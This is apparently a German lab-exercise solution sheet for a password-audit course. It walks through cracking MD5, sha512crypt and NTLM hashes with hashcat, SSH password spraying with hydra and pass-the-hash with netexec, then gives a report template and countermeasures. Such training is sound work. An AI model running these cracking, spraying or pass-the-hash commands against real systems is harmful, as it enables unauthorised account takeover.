# Lösung – Übung 10: Vollständige Credential-Attack-Kette

Beispiel-Durchlauf über die in den Themen gesammelten Hashes. `password-audit-report-template.md` ist das Gerüst.

## 1. Sammeln & Identifizieren

```bash
# alle Quellen zusammenführen (getrennt pro Typ halten)
cat dvwa_users.hash shadow_hashes.txt ntlm.hash
hashid '<beispiel-hash>'          # Typ je Quelle bestimmen
```
Typen: DVWA = MD5 (`-m 0`), shadow = sha512crypt (`-m 1800`), NTLM (`-m 1000`).

## 2. Cracking-Strategie (günstig → teuer)

```bash
# 1) Wortliste pur
hashcat -m 0 dvwa_users.hash rockyou.txt
# 2) + Rules
hashcat -m 0 dvwa_users.hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# 3) shadow (teuer) mit rockyou
hashcat -m 1800 shadow_hashes.txt rockyou.txt
# 4) Custom (cewl/crunch) + Rules für zielspezifische
hashcat -m 1800 shadow_hashes.txt cewl.txt -r best64.rule
# 5) Masks für bekannte Muster
hashcat -m 1000 ntlm.hash -a 3 '?u?l?l?l?l?l?d?d'
```
Dokumentieren, was in welcher Stufe fiel (für die Report-Statistik).

## 3. Statistik

```bash
hashcat -m 0 dvwa_users.hash --show | wc -l     # geknackte zählen
# Häufigkeiten der Klartexte:
hashcat -m 0 dvwa_users.hash --show | cut -d: -f2 | sort | uniq -c | sort -rn
```
→ Crack-Quote in %, häufigste Passwörter/Muster, Wiederverwendung (gleiche Klartexte/Hashes bei mehreren Accounts).

## 4. Reuse / Lateral

```bash
# geknacktes Passwort gegen andere Dienste (Spraying):
hydra -L users.txt -p '<geknacktes_pw>' <ZIEL> ssh -t 4 -W 5
# bzw. NTLM-Hash per PtH (Windows-Lab):
netexec smb 192.168.56.0/24 -u Administrator -H <NT> --local-auth
```

## 5. Report

`password-audit-report-template.md` ausfüllen: Crack-Quote je Quelle, häufigste/mehrfach genutzte Passwörter, Policy-Lücken (schwach, wiederverwendet, schnelle Hashes, kontextbezogen) und priorisierte Gegenmaßnahmen.

## Gegenmaßnahmen (gebündelt)

- **MFA** (wichtigste Einzelmaßnahme – entwertet Cracking/Reuse), **Länge ≥ 14 / Passphrasen** + **Leak-Sperrlisten**, **keine Wiederverwendung** (LAPS für lokale Admins), **langsame gesalzene Hashes** (bcrypt/Argon2), **Lockout/Rate-Limit/Monitoring**, **LM/NTLM aus + Kerberos/Credential Guard**.

## Häufige Fehler / Troubleshooting

- **Typen gemischt in einer Datei:** pro Hash-Typ getrennt cracken (`-m` passend).
- **Nur Crack-Output, kein Audit:** der Wert liegt in **Statistik + Policy-Findings + Maßnahmen**, nicht in der Liste der Klartexte.
- **Klartexte unsicher verteilt:** gecrackte Passwörter sind hochsensibel – im Report nur aggregiert/separat, nicht breit streuen.
- **shadow dauert ewig:** erwartbar (key stretching) – gezielte Listen/Rules statt purer Brute-Force.
